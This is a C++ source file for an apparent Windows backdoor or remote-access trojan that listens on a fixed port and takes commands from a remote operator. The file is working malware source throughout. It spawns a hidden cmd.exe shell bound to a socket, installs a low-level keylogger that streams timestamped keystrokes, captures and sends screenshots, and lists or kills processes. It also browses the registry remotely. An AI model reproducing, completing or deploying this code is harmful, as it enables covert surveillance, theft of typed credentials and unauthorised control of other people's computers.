#pragma comment(lib,"ws2_32.lib")
#include <winsock2.h>
#include <psapi.h>
#include <windows.h>
#include <iostream>
#include <string>
#include <locale>
#include <codecvt>

#define MasterPort 11451

SOCKET CSocket, SSocket;

std::wstring StringToWideString(const std::string& str) {
    std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
    return converter.from_bytes(str);
}

std::string WideStringToString(const std::wstring& wstr) {
    std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
    return converter.to_bytes(wstr);
}

LPCWSTR CharToLPCWSTR(const char* charString) {
    int size_needed = MultiByteToWideChar(CP_UTF8, 0, charString, -1, NULL, 0);
    wchar_t* wString = new wchar_t[size_needed];
    MultiByteToWideChar(CP_UTF8, 0, charString, -1, wString, size_needed);
    return wString;
}

LPWSTR CharToLPWSTR(const char* charString) {
    int size_needed = MultiByteToWideChar(CP_UTF8, 0, charString, -1, NULL, 0);
    wchar_t* wString = new wchar_t[size_needed];
    MultiByteToWideChar(CP_UTF8, 0, charString, -1, wString, size_needed);
    return wString;
}

LRESULT CALLBACK KeyboardHookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;

        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            char key = static_cast<char>(kbStruct->vkCode);

            std::string keyLog;

            if (GetAsyncKeyState(VK_CONTROL) & 0x8000) {
                keyLog = "[Ctrl]";
            }
            if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {
                keyLog = "[Shift]";
            }
            if (GetAsyncKeyState(VK_MENU) & 0x8000) {
                keyLog = "[Alt]";
            }

            if (key == VK_RETURN) {
                keyLog = "[Enter]";
            }
            else if (key == VK_SPACE) {
                keyLog = "[Space]";
            }
            else if (key == VK_TAB) {
                keyLog = "[Tab]";
            }
            else if (key == VK_BACK) {
                keyLog = "[Backspace]";
            }
            else if (key == VK_ESCAPE) {
                keyLog = "[Esc]";
            }
            else if (key == VK_MENU) {
                keyLog = "[Alt]";
            }
            else if (key == VK_UP) {
                keyLog = "[Up]";
            }
            else if (key == VK_DOWN) {
                keyLog = "[Down]";
            }
            else if (key == VK_LEFT) {
                keyLog = "[Left]";
            }
            else if (key == VK_RIGHT) {
                keyLog = "[Right]";
            }
            else if (key == VK_F1) {
                keyLog = "[F1]";
            }
            else if (key == VK_F2) {
                keyLog = "[F2]";
            }
            else if (key == VK_F3) {
                keyLog = "[F3]";
            }
            else if (key == VK_F4) {
                keyLog = "[F4]";
            }
            else if (key == VK_F5) {
                keyLog = "[F5]";
            }
            else if (key == VK_F6) {
                keyLog = "[F6]";
            }
            else if (key == VK_F7) {
                keyLog = "[F7]";
            }
            else if (key == VK_F8) {
                keyLog = "[F8]";
            }
            else if (key == VK_F9) {
                keyLog = "[F9]";
            }
            else if (key == VK_F10) {
                keyLog = "[F10]";
            }
            else if (key == VK_NUMPAD0) {
                keyLog = "0";
            }
            else if (key == VK_NUMPAD1) {
                keyLog = "1";
            }
            else if (key == VK_NUMPAD2) {
                keyLog = "2";
            }
            else if (key == VK_NUMPAD3) {
                keyLog = "3";
            }
            else if (key == VK_NUMPAD4) {
                keyLog = "4";
            }
            else if (key == VK_NUMPAD5) {
                keyLog = "5";
            }
            else if (key == VK_NUMPAD6) {
                keyLog = "6";
            }
            else if (key == VK_NUMPAD7) {
                keyLog = "7";
            }
            else if (key == VK_NUMPAD8) {
                keyLog = "8";
            }
            else if (key == VK_NUMPAD9) {
                keyLog = "9";
            }
            else if (key == VK_MULTIPLY) {
                keyLog = "*";
            }
            else if (key == VK_ADD) {
                keyLog = "+";
            }
            else if (key == VK_SUBTRACT) {
                keyLog = "-";
            }
            else if (key == VK_DIVIDE) {
                keyLog = "/";
            }
            else if (key == VK_DECIMAL) {
                keyLog = ".";
            }
            else if (key == VK_NUMLOCK) {
                keyLog = "[Numlock]";
            }
            else if (key >= 32 && key <= 126) {
                keyLog = key;
            }

            SYSTEMTIME time;
            GetLocalTime(&time);

            keyLog = "[" + std::to_string(time.wYear) + "-" + std::to_string(time.wMonth) + "-" + std::to_string(time.wDay) + " " + std::to_string(time.wHour) + ":" + std::to_string(time.wMinute) + ":" + std::to_string(time.wSecond) + "] " + keyLog + "\n";
            send(SSocket, keyLog.c_str(), keyLog.size(), 0);
        }
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void CaptureScreen(const wchar_t* fileName, int port) {
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);

    int screenWidth = GetDeviceCaps(hdcScreen, DESKTOPHORZRES);
    int screenHeight = GetDeviceCaps(hdcScreen, DESKTOPVERTRES);

    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, screenWidth, screenHeight);
    SelectObject(hdcMem, hBitmap);

    BitBlt(hdcMem, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);

    BITMAP bmp;
    GetObject(hBitmap, sizeof(BITMAP), &bmp);

    BITMAPINFOHEADER bi;
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = bmp.bmWidth;
    bi.biHeight = bmp.bmHeight;
    bi.biPlanes = 1;
    bi.biBitCount = 32;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;

    DWORD dwBmpSize = ((bmp.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmp.bmHeight;
    BYTE* lpBmp = new BYTE[dwBmpSize];

    GetDIBits(hdcScreen, hBitmap, 0, bmp.bmHeight, lpBmp, (BITMAPINFO*)&bi, DIB_RGB_COLORS);

    HANDLE hFile = CreateFileW(fileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        std::cerr << "Error creating file!" << std::endl;
        delete[] lpBmp;
        return;
    }

    // file header
    BITMAPFILEHEADER bmfHeader;
    bmfHeader.bfType = 0x4D42;  // "BM"
    bmfHeader.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwBmpSize;
    bmfHeader.bfReserved1 = 0;
    bmfHeader.bfReserved2 = 0;
    bmfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

    DWORD dwWritten = 0;
    WriteFile(hFile, &bmfHeader, sizeof(BITMAPFILEHEADER), &dwWritten, NULL);
    WriteFile(hFile, &bi, sizeof(BITMAPINFOHEADER), &dwWritten, NULL);
    WriteFile(hFile, lpBmp, dwBmpSize, &dwWritten, NULL);

    DWORD dwFileSize = GetFileSize(hFile, NULL);
    BYTE* lpFile = new BYTE[dwFileSize];
    int err = SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    if (err == INVALID_SET_FILE_POINTER) {
        std::cerr << "SetFilePointer failed: " << GetLastError() << std::endl;
    }

    CloseHandle(hFile);
    hFile = CreateFileW(fileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        std::cerr << "Error opening file for reading!" << std::endl;
        delete[] lpBmp;
        return;
    }
    err = ReadFile(hFile, lpFile, dwFileSize, &dwWritten, NULL);
    if (err == 0) {
		std::cerr << "ReadFile failed: " << GetLastError() << std::endl;
		return;
	}

    WSADATA WSADa;
    sockaddr_in SockAddrIn;
    SOCKET cSocket, sSocket;
    int iAddrSize;
    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFO StartupInfo;
    LPWSTR szCMDPath = new WCHAR[256];

    ZeroMemory(&ProcessInfo, sizeof(PROCESS_INFORMATION));
    ZeroMemory(&StartupInfo, sizeof(STARTUPINFO));
    ZeroMemory(&WSADa, sizeof(WSADa));

    GetEnvironmentVariable(L"COMSPEC", szCMDPath, 256);

    err = WSAStartup(0x0202, &WSADa);
    if (err != 0) {
        std::cerr << "WSAStartup failed: " << err << std::endl;
        return;
    }

    SockAddrIn.sin_family = AF_INET;
    SockAddrIn.sin_addr.s_addr = INADDR_ANY;
    SockAddrIn.sin_port = htons(port);
    cSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    bind(cSocket, (sockaddr*)&SockAddrIn, sizeof(SockAddrIn));
    listen(cSocket, 1);
    iAddrSize = sizeof(SockAddrIn);
    sSocket = accept(cSocket, (sockaddr*)&SockAddrIn, &iAddrSize);

    send(sSocket, (char*)lpFile, dwFileSize, 0);

    closesocket(cSocket);
    closesocket(sSocket);

    CloseHandle(hFile);
    ReleaseDC(NULL, hdcScreen);
    DeleteDC(hdcMem);
    DeleteObject(hBitmap);
    delete[] lpBmp;
}

int ReverseShell(int port) {
    WSADATA WSADa;
    sockaddr_in SockAddrIn;
    SOCKET CSocket, SSocket;
    int iAddrSize;
    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFO StartupInfo;
    LPWSTR szCMDPath = new WCHAR[256];

    ZeroMemory(&ProcessInfo, sizeof(PROCESS_INFORMATION));
    ZeroMemory(&StartupInfo, sizeof(STARTUPINFO));
    ZeroMemory(&WSADa, sizeof(WSADa));

    GetEnvironmentVariable(L"COMSPEC", szCMDPath, 256);

    int err = WSAStartup(0x0202, &WSADa);
    if (err != 0) {
		std::cerr << "WSAStartup failed: " << err << std::endl;
		return 1;
	}

    SockAddrIn.sin_family = AF_INET;
    SockAddrIn.sin_addr.s_addr = INADDR_ANY;
    SockAddrIn.sin_port = htons(port);
    CSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    bind(CSocket, (sockaddr*)&SockAddrIn, sizeof(SockAddrIn));
    listen(CSocket, 1);
    iAddrSize = sizeof(SockAddrIn);
    SSocket = accept(CSocket, (sockaddr*)&SockAddrIn, &iAddrSize);

    StartupInfo.cb = sizeof(STARTUPINFO);
    StartupInfo.wShowWindow = SW_HIDE;
    StartupInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    StartupInfo.hStdInput = (HANDLE)SSocket;
    StartupInfo.hStdOutput = (HANDLE)SSocket;
    StartupInfo.hStdError = (HANDLE)SSocket;

    CreateProcess(NULL, szCMDPath, NULL, NULL, TRUE, 0, NULL, NULL, &StartupInfo, &ProcessInfo);

    WaitForSingleObject(ProcessInfo.hProcess, INFINITE);
    CloseHandle(ProcessInfo.hProcess);
    CloseHandle(ProcessInfo.hThread);
    closesocket(CSocket);
    closesocket(SSocket);
    WSACleanup();

    return 0;
}

void ListProcesses() {
    DWORD processes[1024];
    DWORD cbNeeded;

    if (EnumProcesses(processes, sizeof(processes), &cbNeeded)) {
        DWORD numProcesses = cbNeeded / sizeof(DWORD);

        for (DWORD i = 0; i < numProcesses; ++i) {
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processes[i]);

            if (hProcess != NULL) {
                HMODULE hModule;
                DWORD cbNeededModule;

                if (EnumProcessModules(hProcess, &hModule, sizeof(hModule), &cbNeededModule)) {
                    TCHAR szProcessName[MAX_PATH];

                    // 获取进程名
                    if (GetModuleBaseName(hProcess, hModule, szProcessName, sizeof(szProcessName) / sizeof(TCHAR))) {
                        std::wcout << "PID: " << processes[i] << "\tProcess Name: " << szProcessName << std::endl;
                        std::string line = "\tPID: " + std::to_string(processes[i]) + "\tProcess Name: " + WideStringToString(szProcessName) + "\n";
                        send(SSocket, line.c_str(), line.size(), 0);
                    }
                }
                CloseHandle(hProcess);
            }
        }
    }
    else {
        std::cerr << "Failed to enumerate processes. Error code: " << GetLastError() << std::endl;
    }
}

void KillProcess(int pid) {
	HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);

    if (hProcess != NULL) {
        if (TerminateProcess(hProcess, 0)) {
			std::cout << "Process terminated." << std::endl;
            send(SSocket, "Process terminated.\n", sizeof("Process terminated.\n"), 0);
		}
        else {
			std::cerr << "Failed to terminate process. Error code: " << GetLastError() << std::endl;
		}

		CloseHandle(hProcess);
	}
    else {
		std::cerr << "Failed to open process. Error code: " << GetLastError() << std::endl;
	}
}

void ListKeys(HKEY hKey) {
    DWORD index = 0;
    WCHAR subKeyName[MAX_PATH];
    DWORD subKeyNameSize = sizeof(subKeyName) / sizeof(subKeyName[0]);

    while (RegEnumKeyEx(hKey, index, subKeyName, &subKeyNameSize, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
        send(SSocket, ("\t"+WideStringToString(subKeyName) + "\n").c_str(), WideStringToString(subKeyName).size()+2, 0);
        ++index;
        subKeyNameSize = sizeof(subKeyName) / sizeof(subKeyName[0]);
    }
}

void PrintValue(HKEY hKey, const std::wstring& valueName) {
    DWORD valueType;
    DWORD dataSize;

    if (RegQueryValueEx(hKey, valueName.c_str(), NULL, &valueType, NULL, &dataSize) == ERROR_SUCCESS) {
        if (valueType == REG_SZ || valueType == REG_EXPAND_SZ || valueType == REG_MULTI_SZ) {
            WCHAR* buffer = new WCHAR[dataSize / sizeof(WCHAR)];

            if (RegQueryValueEx(hKey, valueName.c_str(), NULL, NULL, reinterpret_cast<BYTE*>(buffer), &dataSize) == ERROR_SUCCESS) {
                std::wcout << buffer << std::endl;
                send(SSocket, ("\t"+WideStringToString(buffer) + "\n").c_str(), WideStringToString(buffer).size() + 2, 0);
            }
            else {
                std::cerr << "Error querying value. Error code: " << GetLastError() << std::endl;
            }

            delete[] buffer;
        }
        else if (valueType == REG_DWORD) {
            DWORD data;

            if (RegQueryValueEx(hKey, valueName.c_str(), NULL, NULL, reinterpret_cast<BYTE*>(&data), &dataSize) == ERROR_SUCCESS) {
                send(SSocket, ("\t"+std::to_string(data) + "\n").c_str(), std::to_string(data).size() + 2, 0);
            }
            else {
                std::cerr << "Error querying value. Error code: " << GetLastError() << std::endl;
            }
        }
    }
    else {
        std::cerr << "Error querying value size. Error code: " << GetLastError() << std::endl;
    }
}

void ListValues(HKEY hKey) {
    DWORD index = 0;
    WCHAR valueName[MAX_PATH];
    DWORD valueNameSize = sizeof(valueName) / sizeof(valueName[0]);
    DWORD valueType;
    DWORD dataSize[1024];

    while (RegEnumValue(hKey, index, valueName, &valueNameSize, NULL, &valueType, NULL, dataSize) == ERROR_SUCCESS) {
        std::wcout << valueName << std::endl;
        send(SSocket, ("\t"+WideStringToString(valueName) + "\n").c_str(), WideStringToString(valueName).size()+2, 0);
        ++index;
        valueNameSize = sizeof(valueName) / sizeof(valueName[0]);
    }
}

int ViewRegistry() {
    HKEY currentKey = HKEY_LOCAL_MACHINE;
    std::wstring currentPath = L"";

    while (1) {
        std::string command;
        char recvbuf[1024] = {0};
        std::string prompt = "[" + WideStringToString(currentPath) + "]> ";
        send(SSocket, prompt.c_str(), prompt.size(), 0);
        int len = recv(SSocket, recvbuf, sizeof(recvbuf), 0);
        if (len == SOCKET_ERROR) {
			std::cerr << "recv failed: " << WSAGetLastError() << std::endl;
            continue;
		}
        recvbuf[len-1] = '\0';
        command = recvbuf;

        if (command == "ls") {
            ListKeys(currentKey);
        }
        else if (command.compare(0, 2, "cd") == 0) {
            std::wstring path = StringToWideString(command.substr(3));

            HKEY newKey;
            if (RegOpenKeyEx(currentKey, path.c_str(), 0, KEY_READ, &newKey) == ERROR_SUCCESS) {
                currentKey = newKey;
                currentPath = path;
            }
            else {
                std::cerr << "Error changing directory." << std::endl;
            }
        }
        else if (command.compare(0, 3, "cat") == 0) {
            std::wstring valueName = StringToWideString(command.substr(4));
            PrintValue(currentKey, valueName);
        }
        else if (command == "query") {
            ListValues(currentKey);
        }
        else if (command == "exit") {
            break;
        }
        else {
            std::cerr << "Unknown command." << std::endl;
        }
    }

    RegCloseKey(currentKey);

    return 0;
}

int main() {
    WSADATA WSADa;
    sockaddr_in SockAddrIn;

    int iAddrSize;
    int err;

    err = WSAStartup(0x0202, &WSADa);
    if (err != 0) {
        std::cerr << "WSAStartup failed: " << err << std::endl;
        return 1;
    }

    SockAddrIn.sin_family = AF_INET;
    SockAddrIn.sin_addr.s_addr = INADDR_ANY;
    SockAddrIn.sin_port = htons(MasterPort);
    CSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    err = bind(CSocket, (sockaddr*)&SockAddrIn, sizeof(SockAddrIn));
    if (err == SOCKET_ERROR) {
        std::cerr << "bind failed: " << WSAGetLastError() << std::endl;
        closesocket(CSocket);
        WSACleanup();
        return 1;
    }
    err = listen(CSocket, 1);
    if (err == SOCKET_ERROR) {
		std::cerr << "listen failed: " << WSAGetLastError() << std::endl;
		closesocket(CSocket);
		WSACleanup();
		return 1;
	}
    iAddrSize = sizeof(SockAddrIn);
    SSocket = accept(CSocket, (sockaddr*)&SockAddrIn, &iAddrSize);
    if (SSocket == INVALID_SOCKET) {
		std::cerr << "accept failed: " << WSAGetLastError() << std::endl;
		closesocket(CSocket);
		WSACleanup();
		return 1;
	}

    while (1) {
        char cmd[256] = {0};
        send(SSocket, "> ", sizeof("> "), 0);

        int bytesReceived = recv(SSocket, cmd, sizeof(cmd) - 1, 0);
        if (bytesReceived == SOCKET_ERROR) {
            std::cerr << "recv failed: " << WSAGetLastError() << std::endl;
        }
        else {
            cmd[bytesReceived-1] = '\0';
            std::cout << cmd << std::endl;
        }

        if (strcmp(cmd, "shell") == 0) {
            char port[10] = {0};
            int recvb = recv(SSocket, port, sizeof(port) - 1, 0);
            if (recvb == SOCKET_ERROR) {
                std::cerr << "recv failed: " << WSAGetLastError() << std::endl;
            }
            else {
                cmd[recvb-1] = '\0';
            }
            ReverseShell(atoi(port));
        }
        if (strcmp(cmd, "process") == 0) {
            ListProcesses();
        }
        if (strcmp(cmd, "kill") == 0) {
            char pid[10] = { 0 };
            send(SSocket, "pid: ", sizeof("pid: "), 0);
            int recvb = recv(SSocket, pid, sizeof(pid) - 1, 0);
            if (recvb == SOCKET_ERROR) {
                std::cerr << "recv failed: " << WSAGetLastError() << std::endl;
            }
            else {
                cmd[recvb - 1] = '\0';
            }
            KillProcess(atoi(pid));
        }
        if (strcmp(cmd, "screenshot") == 0) {
            const wchar_t* fileName = L"screenshot.bmp";
            char port[10] = { 0 };
            send(SSocket, "receive port: ", sizeof("receive port: "), 0);
            int recvb = recv(SSocket, port, sizeof(port) - 1, 0);
            if (recvb == SOCKET_ERROR) {
				std::cerr << "recv failed: " << WSAGetLastError() << std::endl;
			}
            else {
				port[recvb - 1] = '\0';
			}
            CaptureScreen(fileName, atoi(port));
        }
        if (strcmp(cmd, "key") == 0) {
            HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookCallback, GetModuleHandle(NULL), 0);

            if (keyboardHook == NULL) {
                std::cerr << "Failed to install keyboard hook." << std::endl;
                return 1;
            }

            MSG msg;
            while (GetMessage(&msg, NULL, 0, 0) != 0) {
                TranslateMessage(&msg);
                DispatchMessage(&msg);
            }

            UnhookWindowsHookEx(keyboardHook);
        }
        if (strcmp(cmd, "reg") == 0) {
            ViewRegistry();
        }
    }

    closesocket(CSocket);
    closesocket(SSocket);
    WSACleanup();

    return 0;
}